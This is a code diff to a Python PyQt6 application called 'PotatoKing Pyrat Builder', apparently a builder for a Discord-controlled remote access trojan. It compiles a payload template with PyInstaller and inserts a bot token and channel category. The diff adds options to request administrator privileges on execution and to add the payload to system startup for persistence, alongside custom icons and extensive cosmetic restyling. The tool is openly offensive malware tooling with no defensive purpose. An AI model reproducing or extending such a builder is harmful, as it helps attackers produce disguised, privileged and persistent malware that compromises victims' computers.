@@ -6,7 +6,7 @@ import base64
 import re
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                              QFormLayout, QLabel, QLineEdit, QPushButton, QFileDialog, 
-                             QPlainTextEdit, QGroupBox, QColorDialog, QStatusBar)
+                             QPlainTextEdit, QGroupBox, QColorDialog, QStatusBar, QCheckBox)
 from PyQt6.QtGui import QFont, QIcon, QColor, QPixmap, QCursor
 from PyQt6.QtCore import QObject, QThread, pyqtSignal, Qt
 
@@ -36,6 +36,7 @@ class Worker(QObject):
             
             code_with_config = template_code.replace("token", self.config["token"])
             code_with_config = code_with_config.replace("123456789012345678", self.config["category_id"])
+            code_with_config = code_with_config.replace("'%ADD_TO_STARTUP%'", str(self.config['add_to_startup']))
 
             r, g, b = self.config["theme_color"].getRgb()[:3]
             code_with_config = re.sub(
@@ -60,6 +61,10 @@ class Worker(QObject):
             if self.config["icon_path"] and os.path.exists(self.config["icon_path"]):
                 pyinstaller_cmd.extend(['--icon', self.config["icon_path"]])
                 self.log_message.emit(f"[*] Added icon: {self.config['icon_path']}")
+                
+            if self.config["require_admin"]:
+                pyinstaller_cmd.extend(['--uac-admin'])
+                self.log_message.emit("[*] Payload configured to request administrator privileges.")
             
             pyinstaller_cmd.append(build_file)
 
@@ -104,30 +109,32 @@ class PyratBuilderApp(QMainWindow):
     def __init__(self):
         super().__init__()
         self.setWindowTitle("PotatoKing Pyrat Builder")
-        self.setGeometry(100, 100, 750, 850)
-        self.setMinimumSize(700, 800)
+        self.setFixedSize(750, 900)
+        self.setWindowFlags(self.windowFlags() & ~Qt.WindowType.WindowMaximizeButtonHint)
         
         self.theme_color = QColor("#00FFFF")
 
         self.central_widget = QWidget()
+        self.central_widget.setObjectName("CentralWidget")
         self.setCentralWidget(self.central_widget)
         self.main_layout = QVBoxLayout(self.central_widget)
-        self.main_layout.setContentsMargins(30, 20, 30, 20)
-        self.main_layout.setSpacing(15)
+        self.main_layout.setContentsMargins(30, 25, 30, 25)
+        self.main_layout.setSpacing(18)
         
         self.init_ui()
         self._update_theme_style()
         self._set_app_icon()
 
     def init_ui(self):
-        credits_label = QLabel("Developed by PotatoKing | https://potatoking.net")
-        credits_label.setFont(QFont("Segoe UI", 9))
+        credits_label = QLabel("Developed by PotatoKing | https://pyrat.site")
+        credits_label.setFont(QFont("Segoe UI", 10))
         credits_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        credits_label.setStyleSheet("color: #888; margin-bottom: 10px;")
+        credits_label.setStyleSheet("color: #7a7a85; margin-bottom: 15px;")
         self.main_layout.addWidget(credits_label)
 
         config_group = QGroupBox("Core Configuration")
         form_layout = QFormLayout(config_group)
+        form_layout.setContentsMargins(20, 35, 20, 20)
         form_layout.setSpacing(15)
         
         self.token_input = QLineEdit()
@@ -145,8 +152,21 @@ class PyratBuilderApp(QMainWindow):
         form_layout.addRow(self._create_label("Output Filename:"), self.filename_input)
         self.main_layout.addWidget(config_group)
 
+        options_group = QGroupBox("Payload Options")
+        options_layout = QVBoxLayout(options_group)
+        options_layout.setContentsMargins(20, 35, 20, 20)
+        options_layout.setSpacing(12)
+        
+        self.require_admin_checkbox = QCheckBox("Request administrator privileges on execution (--uac-admin)")
+        self.add_to_startup_checkbox = QCheckBox("Add to system startup for persistence")
+        
+        options_layout.addWidget(self.require_admin_checkbox)
+        options_layout.addWidget(self.add_to_startup_checkbox)
+        self.main_layout.addWidget(options_group)
+
         custom_group = QGroupBox("Cosmetic Customization")
         custom_layout = QFormLayout(custom_group)
+        custom_layout.setContentsMargins(20, 35, 20, 20)
         custom_layout.setSpacing(15)
         
         self.icon_path_input = QLineEdit()
@@ -162,7 +182,7 @@ class PyratBuilderApp(QMainWindow):
         color_layout = QHBoxLayout()
         self.color_preview = QLabel()
         self.color_preview.setFixedSize(24, 24)
-        self.color_preview.setStyleSheet(f"background-color: {self.theme_color.name()}; border-radius: 12px; border: 2px solid #555;")
+        self.color_preview.setStyleSheet(f"background-color: {self.theme_color.name()}; border-radius: 12px; border: 2px solid #23232e;")
         
         self.color_button = QPushButton("Select Discord Theme Color")
         self.color_button.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
@@ -209,81 +229,110 @@ class PyratBuilderApp(QMainWindow):
         darker_color = self.theme_color.darker(120).name()
         
         style_sheet = f"""
-            QMainWindow, QWidget {{
-                background-color: #1a1a1a;
+            QMainWindow, #CentralWidget {{
+                background-color: #0d0d12;
                 color: #e0e0e0;
                 font-family: 'Segoe UI', Arial, sans-serif;
             }}
             QGroupBox {{
                 font-weight: bold;
-                font-size: 13px;
-                border: 1px solid #333;
-                border-radius: 8px;
-                margin-top: 20px;
-                padding: 20px 15px;
-                background-color: #222;
+                font-size: 14px;
+                border: 1px solid #23232e;
+                border-radius: 10px;
+                margin-top: 25px;
+                background-color: #15151c;
             }}
             QGroupBox::title {{
                 subcontrol-origin: margin;
                 subcontrol-position: top left;
                 padding: 0 10px;
-                left: 10px;
+                left: 15px;
                 color: {color_hex};
+                background-color: transparent;
+            }}
+            QLabel {{
+                background-color: transparent;
+                color: #e0e0e0;
             }}
             QLineEdit {{
-                background-color: #111;
-                border: 1px solid #444;
-                padding: 6px 10px;
+                background-color: #09090c;
+                border: 1px solid #23232e;
+                padding: 8px 12px;
                 min-height: 22px;
-                border-radius: 4px;
-                color: #fff;
+                border-radius: 6px;
+                color: #ffffff;
                 font-size: 13px;
+            }}
+            QLineEdit::placeholder {{
+                color: #555566;
             }}
             QLineEdit:focus {{
                 border: 1px solid {color_hex};
             }}
             QPushButton {{
-                background-color: #333;
-                border: 1px solid #444;
-                padding: 6px 15px;
+                background-color: #1a1a24;
+                border: 1px solid #23232e;
+                padding: 8px 15px;
                 min-height: 22px;
-                border-radius: 4px;
-                color: #fff;
+                border-radius: 6px;
+                color: #ffffff;
+                font-weight: bold;
             }}
             QPushButton:hover {{
-                background-color: #444;
+                background-color: #23232e;
                 border-color: {color_hex};
+                color: {color_hex};
             }}
             #BuildButton {{
                 background-color: {color_hex};
-                color: #000;
+                color: #0d0d12;
                 border: none;
-                border-radius: 6px;
-                margin-top: 10px;
-                min-height: 45px;
+                border-radius: 8px;
+                margin-top: 15px;
+                min-height: 50px;
             }}
             #BuildButton:hover {{
                 background-color: {darker_color};
             }}
             #BuildButton:disabled {{
-                background-color: #444;
-                color: #888;
+                background-color: #15151c;
+                color: #444455;
+            }}
+            QCheckBox {{
+                color: #e0e0e0;
+                font-size: 13px;
+                spacing: 12px;
+                background-color: transparent;
+            }}
+            QCheckBox::indicator {{
+                width: 18px;
+                height: 18px;
+                border-radius: 4px;
+                border: 1px solid #333344;
+                background-color: #09090c;
+            }}
+            QCheckBox::indicator:hover {{
+                border: 1px solid {color_hex};
+            }}
+            QCheckBox::indicator:checked {{
+                background-color: {color_hex};
+                border: 1px solid {color_hex};
             }}
             QPlainTextEdit {{
-                background-color: #0d0d0d;
+                background-color: #09090c;
                 color: {color_hex};
-                border: 1px solid #333;
-                border-radius: 6px;
-                padding: 10px;
+                border: 1px solid #23232e;
+                border-radius: 8px;
+                padding: 12px;
             }}
             QStatusBar {{
-                color: #888;
-                background-color: #111;
+                color: #7a7a85;
+                background-color: #0d0d12;
             }}
         """
         self.build_button.setObjectName("BuildButton")
         self.setStyleSheet(style_sheet)
-        self.color_preview.setStyleSheet(f"background-color: {color_hex}; border-radius: 12px; border: 2px solid #555;")
+        self.color_preview.setStyleSheet(f"background-color: {color_hex}; border-radius: 12px; border: 2px solid #23232e;")
     
     def _pick_color(self):
         color = QColorDialog.getColor(self.theme_color, self)
@@ -305,6 +354,8 @@ class PyratBuilderApp(QMainWindow):
         self.filename_input.setEnabled(enabled)
         self.icon_path_input.setEnabled(enabled)
         self.color_button.setEnabled(enabled)
+        self.require_admin_checkbox.setEnabled(enabled)
+        self.add_to_startup_checkbox.setEnabled(enabled)
         self.build_button.setEnabled(enabled)
         self.build_button.setText("BUILD PYRAT" if enabled else "BUILDING...")
 
@@ -318,7 +369,9 @@ class PyratBuilderApp(QMainWindow):
             "category_id": self.category_id_input.text().strip(),
             "output_name": self.filename_input.text().strip() or "pyrat_payload",
             "icon_path": self.icon_path_input.text().strip(),
-            "theme_color": self.theme_color
+            "theme_color": self.theme_color,
+            "require_admin": self.require_admin_checkbox.isChecked(),
+            "add_to_startup": self.add_to_startup_checkbox.isChecked()
         }
 
         self.thread = QThread()
